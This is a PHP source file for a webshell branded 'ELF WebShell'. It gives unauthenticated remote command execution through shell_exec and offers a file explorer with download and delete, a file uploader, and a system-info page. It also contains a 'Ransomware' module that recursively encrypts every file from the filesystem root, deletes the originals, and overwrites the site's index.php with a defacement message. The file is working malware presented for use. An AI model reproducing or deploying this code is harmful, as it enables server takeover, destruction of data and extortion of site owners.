<?php
$isAjax = !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
if (!$isAjax) {

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ELF Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
</head>

<body class="bg-black text-red-500 font-mono">
<?php
}
function getflagfromip($ip){
    @$ip=$_SERVER['REMOTE_ADDR'];
    @$json_data = file_get_contents("http://ip-api.com/json/$ip");
    @$ip_data = json_decode($json_data, TRUE);
    @$country= strtolower($ip_data['countryCode']);
    @$iplocee = "<img src='https://api.hostip.info/images/flags/$country.gif' height='13' width='20'/>";
    return $iplocee;
}

function convert($size){
    $unit=array('b','kb','mb','gb','tb','pb');
    return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
}


class FileExplorer {
    private $baseDir;
    public function __construct($baseDir = null) {
        $this->baseDir = rtrim($baseDir ?? getcwd(), DIRECTORY_SEPARATOR);
        if (!is_dir($this->baseDir)) {
            throw new \Exception("Base directory not found: {$this->baseDir}");
        }
    }
    private function sanitizePath($path) {
        $path = $path === null || $path === '' ? '.' : $path;
        $path = str_replace("\0", '', $path);
        $requested = realpath($this->baseDir . DIRECTORY_SEPARATOR . $path);
        if ($requested === false) return false;
        $baseReal = realpath($this->baseDir);
        if (strpos($requested, $baseReal) !== 0) return false;
        return $requested;
    }
    private function breadcrumbs($absPath) {
        $baseReal = realpath($this->baseDir);
        $rel = substr($absPath, strlen($baseReal));
        $segments = array_values(array_filter(explode(DIRECTORY_SEPARATOR, $rel)));

        $parts = [];
        $acc = '';
        $parts[] = ['name' => '/', 'path' => ''];
        foreach ($segments as $seg) {
            $acc .= ($acc === '' ? '' : DIRECTORY_SEPARATOR) . $seg;
            $parts[] = ['name' => $seg, 'path' => ltrim($acc, DIRECTORY_SEPARATOR)];
        }
        return $parts;
    }
    public function renderExplorer($pathParam = null) {
        $abs = $this->sanitizePath($pathParam);
        if ($abs === false) {
            http_response_code(400);
            echo "<div class='p-5 bg-red-900 text-white rounded-lg shadow-xl text-base'>🚫 Invalid path or access denied</div>";
            return;
        }
        $items = scandir($abs);
        usort($items, function($a,$b) use ($abs){
            $isDirA = is_dir($abs . DIRECTORY_SEPARATOR . $a);
            $isDirB = is_dir($abs . DIRECTORY_SEPARATOR . $b);
            if ($isDirA != $isDirB) return $isDirA ? -1 : 1;
            return strcasecmp($a,$b);
        });
        $crumbs = $this->breadcrumbs($abs);
        echo "<div class='bg-black border border-red-700 p-6 rounded-xl shadow-xl text-sm space-y-5 font-mono transform transition-all duration-500 hover:scale-[1.005] hover:shadow-red-900/50'>";
        echo "<h2 class='text-3xl font-extrabold text-red-500 drop-shadow-lg'>📂 File Explorer</h2>";
        echo "<div class='text-gray-300 text-base flex flex-wrap gap-2 items-center'>Current: ";
        foreach ($crumbs as $c) {
            $label = htmlspecialchars($c['name']);
            $link = '/explorer?path=' . urlencode($c['path']);
            echo "<a class='text-red-400 hover:text-red-300 hover:underline transition duration-200' href='".htmlspecialchars($link)."'>{$label}</a> / ";
        }
        echo "</div>";
        echo "<table class='w-full text-base mt-5 text-gray-300 border-collapse'>";
        echo "<thead class='bg-red-900/40'><tr class='text-left text-red-300'><th class='p-2'>Name</th><th class='p-2'>Type</th><th class='p-2'>Size</th><th class='p-2'>Actions</th></tr></thead><tbody>";

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $itemAbs = $abs . DIRECTORY_SEPARATOR . $item;
            $isDir = is_dir($itemAbs);
            $size = $isDir ? '-' : $this->humanFilesize(filesize($itemAbs));
            $nameEsc = htmlspecialchars($item);
            $relPath = ltrim(substr($itemAbs, strlen(realpath($this->baseDir))), DIRECTORY_SEPARATOR);
            $relPathEnc = urlencode($relPath);
            ?>
            <tr class='border-t border-red-700 hover:bg-red-900/20 transition-all duration-150'>
            <td class='p-2'>
            <?php
            if ($isDir) {
                echo "<a class='text-red-400 hover:text-red-300 transition-colors duration-200' href='/explorer?path={$relPathEnc}'>📁 {$nameEsc}</a>";
            } else {
                echo "<a href='#' class='file-link text-gray-200 hover:text-white transition duration-200 cursor-pointer' data-path='{$relPathEnc}'>📄 {$nameEsc}</a>";
            }
            echo "</td><td class='p-2'>".($isDir? 'Directory':'File')."</td><td class='p-2'>{$size}</td><td class='p-2 space-x-2'>";
            if (!$isDir) {
                echo "<a class='px-2 py-1 bg-red-800 hover:bg-red-700 text-white rounded-lg shadow-sm transition-all duration-150' href='/explorer/download?path={$relPathEnc}'>⬇ Download</a>";
                echo "<form class='inline' method='post' action='/explorer/delete' onsubmit='return confirm(\"Delete {$nameEsc}?\");'>";
                echo "<input type='hidden' name='path' value='".htmlspecialchars($relPath)."'/>";
                echo "<button type='submit' class='px-2 py-1 bg-black border border-red-600 hover:bg-red-900 text-red-400 rounded-lg shadow-sm transition-all duration-150'>🗑 Delete</button>";
                echo "</form>";
            } else {
                $canDelete = (count(array_diff(scandir($itemAbs), ['.','..'])) === 0);
                if ($canDelete) {
                    echo "<form class='inline' method='post' action='/explorer/delete' onsubmit='return confirm(\"Delete folder {$nameEsc}?\");'>";
                    echo "<input type='hidden' name='path' value='".htmlspecialchars($relPath)."'/>";
                    ?> 
                    <input type='hidden' name='is_dir' value='1'/>
                    <button type='submit' class='px-2 py-1 bg-black border border-red-600 hover:bg-red-900 text-red-400 rounded-lg shadow-sm transition-all duration-150'>🗑 Delete</button>
                    </form>
                    <?php
                } else {
                    ?><span class='text-gray-500 italic'>Not empty</span><?php
                }
            }
            ?></td></tr><?php
        }
        ?>
        </tbody></table>
        <div id='file-content' class='mt-6 bg-black border border-red-700 p-6 rounded-xl shadow-xl font-mono text-sm text-gray-300 max-h-[70vh] overflow-auto'></div>
        </div>"
        <?php
        echo <<<JS
<script>
document.querySelectorAll('.file-link').forEach(el => {
    el.addEventListener('click', function(e) {
        e.preventDefault();
        const path = this.dataset.path;
        fetch('/explorer/view?path=' + encodeURIComponent(path) , {
            headers: {
            'X-Requested-With': 'XMLHttpRequest'
        }
        })
            .then(response => {
                if (!response.ok) throw new Error('File not found or access denied');
                return response.text();
            })
            .then(html => {
                document.getElementById('file-content').innerHTML = html;
                window.scrollTo({ top: document.getElementById('file-content').offsetTop, behavior: 'smooth' });
            })
            .catch(err => {
                document.getElementById('file-content').innerHTML = "<div class='p-5 bg-red-900 text-white rounded-lg shadow-xl'>🚫 " + err.message + "</div>";
            });
    });
});
</script>
JS;
    }

    public function renderFileContent($pathParam) {
        $pathParam = urldecode($pathParam);
        $abs = $this->sanitizePath($pathParam);
        if ($abs === false || !is_file($abs)) {
            http_response_code(404);
            ?><div class='p-5 bg-red-900 text-white rounded-lg shadow-xl'>🚫 File not found or access denied.</div><?php
            return;
        }

        $content = htmlspecialchars(file_get_contents($abs));
        echo "<h2 class='text-2xl font-bold text-red-500 mb-4'>📄 Viewing: " . htmlspecialchars(basename($abs)) . "</h2>";
        echo "<pre class='bg-black text-red-500 p-4 rounded whitespace-pre-wrap'>" . $content . "</pre>";
        ?><div class='mt-4'><a href='#' onclick='document.getElementById(\"file-content\").innerHTML = \"\"; return false;' class='px-4 py-2 bg-red-800 hover:bg-red-700 text-white rounded-lg shadow-md'>⬅ Close</a></div><?php
    }

    public function handleDownload($pathParam) {
        $abs = $this->sanitizePath($pathParam);
        if ($abs === false || !is_file($abs)) {
            http_response_code(404);
            echo "File not found or access denied.";
            return;
        }
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($abs) . '"');
        header('Content-Length: ' . filesize($abs));
        readfile($abs);
        exit;
    }

    public function handleDelete($pathParam, $isDir = false) {
        $abs = $this->sanitizePath($pathParam);
        if ($abs === false) {
            http_response_code(400);
            echo "Invalid path or access denied.";
            return;
        }

        if ($isDir) {
            if (is_dir($abs) && count(array_diff(scandir($abs), ['.','..'])) === 0) {
                rmdir($abs);
                header("Location: /explorer?path=" . urlencode(dirname($pathParam)));
                exit;
            } else {
                echo "Directory is not empty or does not exist.";
            }
        } else {
            if (is_file($abs)) {
                unlink($abs);
                header("Location: /explorer?path=" . urlencode(dirname($pathParam)));
                exit;
            } else {
                echo "File does not exist.";
            }
        }
    }

    private function humanFilesize($bytes, $decimals = 2) {
        $sz = 'BKMGTP';
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . ' ' . @$sz[$factor];
    }
}




class Router {
    private $routes = [];

    public function get($path, $callback) {
        $this->routes['GET'][$path] = $callback;
    }

    public function post($path, $callback) {
        $this->routes['POST'][$path] = $callback;
    }

    public function dispatch() {
        $method = $_SERVER['REQUEST_METHOD'];
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        
        if (isset($this->routes[$method][$path])) {
            call_user_func($this->routes[$method][$path]);
        } else {
            http_response_code(404);
            echo "<h1 style='color:red;'>404 Not Found</h1>";
        }
    }
}


class FileHandler {
    public function __construct() {
        mkdir("upload");
        $this->iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    }
    public function encryptFile($filePath , $password) {
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
        $data = file_get_contents($filePath);
        $encryptedData = openssl_encrypt($data, 'aes-256-cbc',$password, 0, $iv);
        $encryptedData = $iv . $encryptedData;
        file_put_contents($filePath . '.enc', $encryptedData);
        unlink($filePath);
    }
    public function decryptFile($filePath, $password) {
        $data = file_get_contents($filePath);
        $iv = substr($data, 0, 16);
        $data = substr($data, 16);
        $decryptedData = openssl_decrypt($data, 'aes-256-cbc', $password, 0, $iv);
        file_put_contents(substr($filePath, 0, -4), $decryptedData);
        unlink($filePath);
    }
    public function getFileTree($directory) {
        $fileTree = [];
        $files = scandir($directory);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }
            $filePath = $directory . '/' . $file;
            if (is_dir($filePath)) {
                $fileTree[$file] = $this->getFileTree($filePath);
            } else {
                $fileTree[] = $filePath;
            }
        }
        return $fileTree;
    }
    public function execute_command($cmd=FALSE) {
        ?>
        <form action="<?php echo $_SERVER['REQUEST_URI']; ?>/exec" method="get" class="bg-black p-4 rounded shadow-md mt-6 border border-red-600 space-y-2
            shadow-[0_0_15px_rgba(255,0,0,0.7)] transition-shadow duration-300 hover:shadow-[0_0_25px_rgba(255,50,50,0.9)]">
            <label for="cmd" class="block text-red-400 text-sm"> Enter the Command</label>
            <input type="text" name="command" id="cmd" placeholder="whoami" 
                   class="w-full bg-gray-900 text-red-400 p-2 rounded border border-red-600 focus:outline-none focus:ring-2 focus:ring-red-500">
            <button type="submit" class="mt-2 bg-red-700 hover:bg-red-600 text-white px-4 py-2 rounded shadow-sm transition duration-300">
                Execute
            </button>
        </form>
    
        <?php
        if ($cmd != FALSE) {
            ob_start();
            $output = shell_exec($cmd);
            ob_end_clean();
            $output = preg_replace('/^\x{FEFF}/u', '', $output);
            $escaped_output = addslashes(str_replace(['`', '\\'], ['\\`', '\\\\'], $output));
            echo <<<HTML
            <div
                x-data="{
                    output: '',
                    text: `{$escaped_output}`,
                    cursor: true
                }"
                x-init="
                    let i = 0;
                    let interval = setInterval(() => {
                        if (i < text.length) {
                            output += text[i];
                            i++;
                        } else {
                            clearInterval(interval);
                        }
                    }, 20);
                    setInterval(() => cursor = !cursor, 500);
                "
                class="bg-black text-red-500 p-4 mt-4 rounded shadow-lg font-mono text-sm whitespace-pre border border-red-500 relative overflow-x-auto"
                style="min-height: 6rem; white-space: pre; position: relative;"
            >
                <code x-text="output"></code>
                <span
                    x-show="cursor"
                    class="absolute"
                    style="
                        bottom: 1rem;
                        left: 0.5rem;
                        width: 8px;
                        height: 18px;
                        background-color: #f87171; /* red-400 */
                        animation: blink 1s step-start infinite;
                    "
                ></span>
            </div>
        
            <style>
                @keyframes blink {
                    0%, 50% { opacity: 1; }
                    50.01%, 100% { opacity: 0; }
                }
            </style>
            HTML;
        }
    }
    
    public function deface_web_site($message) {
        chdir($_SERVER['DOCUMENT_ROOT']);
        unlink("index.php");
        $deface = fopen("index.php" , "w+");
        fwrite($deface , "<h1>" . $message . "</h1>");
    }
    public function uploader($path) {
        ?>
        <div class="bg-black border-2 border-red-600 shadow-[0_0_10px_3px_rgba(255,0,0,0.7)] rounded-lg mt-6 max-w-md mx-auto p-6 transition-shadow duration-300 hover:shadow-[0_0_20px_5px_rgba(255,51,0,0.8)]">
            <form action="<?php echo $_SERVER['REQUEST_URI'];?>" method="post" enctype="multipart/form-data" class="flex flex-col space-y-5 bg-black">
                <h2 class="text-2xl font-bold text-red-500 drop-shadow-[0_0_8px_rgba(255,51,0,0.9)]">Upload a File</h2>
    
                <input 
                    id="new_file" 
                    name="new_file" 
                    type="file" 
                    class="bg-gray-900 text-red-600 rounded-md border-2 border-red-600 p-3 cursor-pointer transition duration-300
                           hover:bg-red-600 hover:text-black hover:shadow-[0_0_10px_rgba(255,0,0,0.8)] focus:outline-none focus:ring-2 focus:ring-red-500"
                >
    
                <button 
                    type="submit" 
                    name="submit" 
                    class="bg-red-700 text-white font-semibold rounded-md px-5 py-3 shadow-md transition duration-300
                           hover:bg-red-600 hover:shadow-lg active:scale-95 focus:outline-none focus:ring-4 focus:ring-red-400"
                >
                    Upload
                </button>
            </form>
        </div>
        <?php
    }
    public function main($encrypt = FALSE, $decrypt = FALSE, $password = FALSE) {
        ?>
        <form 
            action="<?php echo $_SERVER['REQUEST_URI']; ?>" 
            method="GET"
            class="max-w-md mx-auto mt-12 p-6 bg-black text-white rounded-xl shadow-lg border border-red-500 drop-shadow-[0_0_10px_rgba(255,0,0,0.8)] animate-fadeInScale"
        >
            <label for="password" class="block mb-2 text-lg font-semibold text-red-400">Enter The Password:</label>
            <input 
                type="password" 
                name="password" 
                id="password" 
                class="w-full p-2 mb-4 bg-gray-800 border border-red-600 rounded text-white focus:outline-none focus:ring-2 focus:ring-red-500"
                required
            >
    
            <div class="flex justify-between space-x-4">
                <button 
                    type="submit" 
                    name="ransomware" 
                    value="Encrypt" 
                    class="flex-1 bg-red-600 text-black font-bold py-2 rounded hover:bg-red-700 transition duration-300"
                >
                    Encrypt
                </button>
                <button 
                    type="submit" 
                    name="ransomware" 
                    value="Decrypt" 
                    class="flex-1 bg-red-600 text-black font-bold py-2 rounded hover:bg-red-700 transition duration-300"
                >
                    Decrypt
                </button>
            </div>
        </form>
    
        <style>
            @keyframes fadeInScale {
                0% { opacity: 0; transform: scale(0.9) translateY(-10px); }
                100% { opacity: 1; transform: scale(1) translateY(0); }
            }
            .animate-fadeInScale {
                animation: fadeInScale 0.4s ease-out forwards;
            }
        </style>
    
        <?php
        if ($encrypt == TRUE && $password != FALSE) {
            $this->deface_web_site("Your Site Hacked By ELF and setup ransomware in your server");
            ?>
            <div id="alertBox" 
                class="max-w-md mx-auto mt-8 p-5 bg-red-700 text-black rounded-lg shadow-lg flex justify-between items-center
                       drop-shadow-[0_0_15px_rgba(255,0,0,0.9)] animate-fadeInScale"
            >
                <span class="font-semibold text-lg">The ransomware encrypt files was running</span>
                <button onclick="document.getElementById('alertBox').remove();" 
                    class="ml-5 bg-black text-red-500 font-bold rounded px-3 py-1 hover:bg-red-500 hover:text-black transition duration-300"
                    aria-label="Dismiss alert"
                >
                    ✕
                </button>
            </div>
            <?php
            $result = $this->getFileTree("/");
            foreach($result as $file){
                $this->encryptFile($file , $password);
            }
        } elseif ($decrypt == TRUE && $password != FALSE) {
            $this->deface_web_site("Your Site opened by ransomware ELF");
            ?>
            <div id="alertBox" 
                class="max-w-md mx-auto mt-8 p-5 bg-red-700 text-black rounded-lg shadow-lg flex justify-between items-center
                       drop-shadow-[0_0_15px_rgba(255,0,0,0.9)] animate-fadeInScale"
            >
                <span class="font-semibold text-lg">The ransomware decrypt files was running</span>
                <button onclick="document.getElementById('alertBox').remove();" 
                    class="ml-5 bg-black text-red-500 font-bold rounded px-3 py-1 hover:bg-red-500 hover:text-black transition duration-300"
                    aria-label="Dismiss alert"
                >
                    ✕
                </button>
            </div>
            <?php
            $result = $this->getFileTree("/");
            foreach($result as $file){
                $this->decryptFile($file , $password);
            }
        }
    }
    
    public function check_args($args , $args2=FALSE , $args3 = FALSE){ 

         if($args == "Ransomware" && $args2 == "Encrypt") {
            $this->main(encrypt:True , password:$args3);

        } elseif($args == "Ransomware" && $args2 == "Decrypt") {
            $this->main(decrypt:True , password:$args3);
            
        } elseif($args == "Ransomware") {
            $this->main();

        } elseif ($args == "Uploader") {
            $this->uploader(path:"/upload");

        } elseif ($args == "Cmd" && $args2 != FALSE) {
            $this->execute_command(cmd:$args2);

        } elseif($args == "Cmd") {
            $this->execute_command();

        }
    }
}

if (!$isAjax) {
?>
<header class="bg-black-900 shadow-md p-5">
    <nav class="flex justify-between items-center">
        <h1 class="text-xl font-bold text-red-600">ELF WebShell</h1>
        <ul class="flex gap-4">
            <li><a href="/" class="text-gray-300 hover:text-red-600">Home</a></li>
            <li><a href="/uploader" class="text-gray-300 hover:text-red-600">Uploader</a></li>
            <li><a href="/ransomware" class="text-gray-300 hover:text-red-600">Ransomware</a></li>
            <li><a href="/cmd" class="text-gray-300 hover:text-red-600">Execute Command</a></li>
            <li><a href="/explorer" class="text-gray-300 hover:text-red-600">File Explorer</a></li>
        </ul>
    </nav>
</header>
<div class=" mx-auto mt-6 p-4 bg-black-800 rounded shadow-lg">
<?php 
}
$app = new FileHandler();
$router = new Router();
$explorer = new FileExplorer(__DIR__ ); 

$router->get("/", function() {
    ?>
    <div class="bg-black border border-red-700 p-6 rounded-lg shadow-lg text-sm space-y-4 font-mono">
        <h2 class="text-2xl font-extrabold text-red-500 border-b border-red-700 pb-3 select-none">E | L F - System Info</h2>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-gray-300">
            <div><span class="text-red-600 font-semibold select-text">Uname:</span> <span class="text-red-400"><?php echo php_uname(); ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">OS:</span> <span class="text-red-400"><?php echo PHP_OS; ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">Server Software:</span> <span class="text-red-400"><?php echo getenv("SERVER_SOFTWARE"); ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">User:</span> <span class="text-red-400"><?php echo get_current_user(); ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">Group (UID):</span> <span class="text-red-400"><?php echo getmyuid(); ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">Your IP:</span> <span class="text-red-400"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">Server IP:</span> 
                <span class="text-red-400">
                    <?php echo function_exists('gethostbyname') ? gethostbyname($_SERVER["HTTP_HOST"]) : '???'; ?>
                </span>
            </div>
            <div><span class="text-red-600 font-semibold select-text">Free Disk Space:</span> 
                <span class="text-red-400">
                    <?php
                    $free = disk_free_space(".");
                    $base = 1024;
                    $class = min((int)log($free , $base), 7);
                    echo sprintf('%.2f %s', $free / pow($base,$class), ['B','KB','MB','GB','TB','EB','ZB','YB'][$class]);
                    ?>
                </span>
            </div>
            <div><span class="text-red-600 font-semibold select-text">Total Disk Space:</span> 
                <span class="text-red-400">
                    <?php
                    $total = disk_total_space(".");
                    $class = min((int)log($total , $base), 7);
                    echo sprintf('%.2f %s', $total / pow($base,$class), ['B','KB','MB','GB','TB','EB','ZB','YB'][$class]);
                    ?>
                </span>
            </div>
            <div><span class="text-red-600 font-semibold select-text">Safe Mode:</span> 
                <span class="text-red-400">
                    <?php
                    echo (ini_get("safe_mode") || strtolower(ini_get("safe_mode")) === "on") ? "ON (Secure)" : "OFF (Not Secure)";
                    ?>
                </span>
            </div>
            <div><span class="text-red-600 font-semibold select-text">PHP Version:</span> <span class="text-red-400"><?php echo phpversion(); ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">Domain:</span> <span class="text-red-400"><?php echo $_SERVER['SERVER_NAME']; ?></span></div>
            <div><span class="text-red-600 font-semibold select-text">Memory Usage:</span> 
                <span class="text-red-400">
                    <?php

                    echo convert(memory_get_usage(true));
                    ?>
                </span>
            </div>
            <div><span class="text-red-600 font-semibold select-text">Date/Time:</span> <span class="text-red-400"><?php echo date('Y-m-d H:i:s'); ?></span></div>
            
            <div class="md:col-span-2">
                <span class="text-red-600 font-semibold select-text">Disabled Functions:</span>
                <span class="text-red-400 break-words">
                    <?php
                    $functions = ini_get('disable_functions');
                    echo empty($functions) ? 'All Functions Accessible' : str_replace(',', ' | ', $functions);
                    ?>
                </span>
            </div>

            <div class="md:col-span-2">
                <span class="text-red-600 font-semibold select-text">Current Script Path:</span>
                <span class="text-red-400 break-words"><?php echo $_SERVER['PHP_SELF']; ?></span>
            </div>
        </div>
    </div>


<?php 
});

$router->get('/explorer', function() use ($explorer) {
    $path = $_GET['path'] ?? null;
    $explorer->renderExplorer($path);
});

$router->get('/explorer/view', function() use ($explorer) {
    $path = $_GET['path'] ?? null;
    $explorer->renderFileContent($path);
});

$router->get('/explorer/download', function() use ($explorer) {
    $path = $_GET['path'] ?? null;
    $explorer->handleDownload($path);
});

$router->post('/explorer/delete', function() use ($explorer) {
    $path = $_POST['path'] ?? null;
    $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == '1';
    $explorer->handleDelete($path, $isDir);
});


$router->get("/uploader", function() use ($app) {
    $app->check_args(args:"Uploader");
});

$router->get("/cmd", function() use ($app) {
    $app->check_args(args:"Cmd");
});

$router->get("/cmd/exec", function() use ($app) {
    $command = $_GET['command'] ?? '';
    $app->check_args(args:"Cmd", args2:$command);
});

$router->get("/ransomware", function() use ($app) {
    $app->check_args(args:"Ransomware");
});

$router->get("/ransomware", function() use ($app) {
    $password = $_GET['password'] ?? '';
    $app->check_args(args:"Ransomware", args2:"Encrypt", args3:$password);
});

$router->get("/ransomware", function() use ($app) {
    $password = $_GET['password'] ?? '';
    $app->check_args(args:"Ransomware", args2:"Decrypt", args3:$password);
});

$router->post("/uploader", function() use ($app) {
    if (isset($_FILES['new_file'])) {
        $file = 'upload/' . basename($_FILES['new_file']['name']);
        if (move_uploaded_file($_FILES['new_file']['tmp_name'], $file)) {
            ?>
            <div id="alertBox" 
                class="max-w-md mx-auto mt-8 p-5 bg-red-700 text-black rounded-lg shadow-lg flex justify-between items-center
                       drop-shadow-[0_0_15px_rgba(255,0,0,0.9)] animate-fadeInScale"
                style="animation-fill-mode: forwards;"
            >
                <span class="font-semibold text-lg">File uploaded successfully</span>
                <button onclick="document.getElementById('alertBox').remove();" 
                    class="ml-5 bg-black text-red-500 font-bold rounded px-3 py-1 hover:bg-red-500 hover:text-black transition duration-300"
                    aria-label="Dismiss alert"
                >
                    ✕
                </button>
            </div>

            <style>
                @keyframes fadeInScale {
                    0% { opacity: 0; transform: scale(0.8) translateY(-10px); }
                    100% { opacity: 1; transform: scale(1) translateY(0); }
                }
                .animate-fadeInScale {
                    animation: fadeInScale 0.35s ease forwards;
                }
            </style>
            <?php
        } else {
            ?>
            <div id="alertBox" 
                class="max-w-md mx-auto mt-8 p-5 bg-red-800 text-black rounded-lg shadow-lg flex justify-between items-center
                       drop-shadow-[0_0_15px_rgba(255,20,20,1)] animate-fadeInScale"
                style="animation-fill-mode: forwards;"
            >
                <span class="font-semibold text-lg">Can't Upload File!</span>
                <button onclick="document.getElementById('alertBox').remove();" 
                    class="ml-5 bg-black text-red-400 font-bold rounded px-3 py-1 hover:bg-red-400 hover:text-black transition duration-300"
                    aria-label="Dismiss alert"
                >
                    ✕
                </button>
            </div>
            <style>
                @keyframes fadeInScale {
                    0% { opacity: 0; transform: scale(0.8) translateY(-10px); }
                    100% { opacity: 1; transform: scale(1) translateY(0); }
                }
                .animate-fadeInScale {
                    animation: fadeInScale 0.35s ease forwards;
                }
            </style>
            <?php
        }
    }
});


$router->dispatch();


?>
</body>
</html>